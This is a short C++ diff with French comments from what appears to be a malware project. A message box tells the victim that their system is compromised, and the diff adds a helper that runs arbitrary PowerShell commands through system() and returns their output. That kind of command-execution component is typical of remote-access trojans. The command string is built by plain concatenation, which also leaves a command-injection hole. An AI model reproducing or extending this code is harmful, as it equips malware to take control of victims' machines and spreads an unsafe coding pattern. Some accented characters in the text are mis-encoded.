@@ -47,3 +47,33 @@ void wind() {
 void ShowMessage() {
     MessageBox(NULL, TEXT("Votre syst�me est compromis !"), TEXT("Alerte"), MB_OK);
 }
+
+// Execute une commande PowerShell et retourne le r�sultat.
+string ExecuteShellCommand(const string& command) {
+    // Redirige la sortie vers un fichier temporaire
+    string tempFile = "std-cmd-output.txt";
+    string fullCommand = "powershell -Command \"" + command + "\" > " + tempFile;
+    
+    // Exécute la commande
+    system(fullCommand.c_str());
+    
+    // Lit le contenu du fichier
+    FILE* file = fopen(tempFile.c_str(), "r");
+    if (!file) {
+        return "Erreur: impossible de lire le résultat";
+    }
+    
+    // Lit le fichier et stocke le contenu
+    char buffer[1024];
+    string result;
+    while (fgets(buffer, sizeof(buffer), file) != nullptr) {
+        result += buffer;
+    }
+    
+    fclose(file);
+    
+    // Supprime le fichier temporaire
+    remove(tempFile.c_str());
+    
+    return result;
+}
